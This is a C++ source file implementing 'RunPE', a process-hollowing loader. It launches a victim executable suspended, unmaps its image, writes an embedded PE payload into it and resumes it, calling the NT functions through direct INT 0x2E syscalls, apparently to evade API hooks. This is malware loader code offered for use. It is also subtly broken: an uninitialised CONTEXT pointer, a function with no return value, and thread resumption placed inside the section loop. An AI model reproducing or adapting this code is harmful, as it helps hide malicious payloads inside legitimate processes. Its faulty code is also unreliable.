// RunPE_v2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<Windows.h>
#include<stdio.h>
#include<iostream>

#include "bytes.h"


//table of proccess which i will use 
char *apis[] =
{
	"NtGetContextThread",
	"NtUnmapViewOfSection",
	"NtAllocateVirtualMemory",
	"NtWriteVirtualMemory",
	"NtSetContextThread",
	"NtResumeThread",


};

int GetProcessNtNumber(const char *proc)
{
	int number = NULL;

	if (ReadProcessMemory(GetCurrentProcess(), (LPVOID)((DWORD)(GetProcAddress(LoadLibraryA("ntdll"), proc)) + 1), &number, 1, NULL))
	{
		return number;
	}

	return 0;
}


std::string rev(std::string string)
{
	string = std::string(string.rbegin(), string.rend());

}

void NtRunPE(LPBYTE buffer, LPCTSTR victimPath)
{
	int API_NUMBER = NULL;

	PIMAGE_DOS_HEADER PDH;
	PIMAGE_NT_HEADERS PNH;
	PIMAGE_SECTION_HEADER PSH;

	PDH = (PIMAGE_DOS_HEADER)&buffer[0];

	//e_lfanew-file address of new .exe header
	
	PNH = (PIMAGE_NT_HEADERS)&buffer[PDH->e_lfanew];



	//e_magic( magic number) - one of DOS headers
	if (PDH->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return;
	}

	if (PNH->Signature != IMAGE_NT_SIGNATURE)
	{
		return;
	}


	PROCESS_INFORMATION PI;
	STARTUPINFO SI;

	ZeroMemory(&SI, sizeof(STARTUPINFO));
	SI.cb = sizeof(STARTUPINFO);

	if (!CreateProcessW(victimPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
	{
		return;
	}


	API_NUMBER = GetProcessNtNumber("NtGetContextThread");


	CONTEXT *context;
	HANDLE hThead = PI.hThread;
	context->ContextFlags = CONTEXT_FULL;


	__asm
	{
		PUSH context
		PUSH hThead

		MOV EAX,API_NUMBER
		MOV EDX,ESP
		INT 0x2E
	}


	if (context->Eax == NULL)
	{
		return;
	}


	API_NUMBER = GetProcessNtNumber("NtUnmapViewOfSection");

	HANDLE hprocess = PI.hProcess;
	DWORD imageBase = PNH->OptionalHeader.ImageBase;

	_asm
	{
		PUSH hprocess
		PUSH imageBase

		MOV EAX,API_NUMBER
		MOV EDX,ESP
		INT 0x2E

	}


	API_NUMBER = GetProcessNtNumber("NtAllocateVirtualMemory");
	DWORD SizeOfImage = PNH->OptionalHeader.SizeOfImage;

			_asm
		{
				PUSH PAGE_EXECUTE_READWRITE
				PUSH MEM_COMMIT|MEM_RESERVE
                PUSH SizeOfImage
				PUSH NULL
				PUSH imageBase
				PUSH hprocess


				MOV EAX,API_NUMBER
				MOV EDX,ESP
				INT 0x2E
		}



		API_NUMBER = GetProcessNtNumber("NtWriteVirtualMemory");
			//step first: save headers
		DWORD SizeOfHeaders = PNH->OptionalHeader.SizeOfHeaders;
		_asm
		{
			PUSH NULL
			PUSH SizeOfHeaders
			PUSH buffer[0]
			PUSH imageBase
			PUSH hprocess


			MOV EAX,API_NUMBER
			MOV EDX,ESP
			INT 0x2E
		}
		

		//step second: save section of PE file
		DWORD pointerToRawData;
		DWORD SizeOfRawData;
		LPVOID nextsection_adrr;


		for (int i = 0; i < PNH->FileHeader.NumberOfSections; i++)
		{

			PSH = (PIMAGE_SECTION_HEADER)&buffer[PDH->e_lfanew + sizeof(PIMAGE_NT_HEADERS) + sizeof(PIMAGE_SECTION_HEADER)*i];
			pointerToRawData = PSH->PointerToRawData;
			SizeOfRawData = PSH->SizeOfRawData;

			nextsection_adrr = (LPVOID)(PNH->OptionalHeader.ImageBase + PSH->VirtualAddress);


			_asm
			{
				PUSH null
				PUSH SizeOfRawData
				PUSH buffer[pointerToRawData]
				PUSH nextsection_adrr
				PUSH hprocess

				MOV EAX,API_NUMBER
				MOV EDX,ESP
				INT 0x2E



			}



			API_NUMBER = GetProcessNtNumber("NtSetContextThread");

			//compute new entrance
			DWORD NewEntry = PNH->OptionalHeader.ImageBase + PNH->OptionalHeader.AddressOfEntryPoint;
			context->Eax = NewEntry;

			_asm
			{
				PUSH context
				PUSH hThead

				MOV EAX,API_NUMBER
				MOV EDX,ESP
				INT 0x2E
			}


			API_NUMBER = GetProcessNtNumber("NtResumeThread");
			
			_asm
			{
				PUSH NULL
				PUSH hThead

				MOV EAX,API_NUMBER
				MOV EDX,ESP
				INT 0x2E
			}






		}

}

int main()
{
	NtRunPE(buffer, L"C:\\Test.exe");

	
}

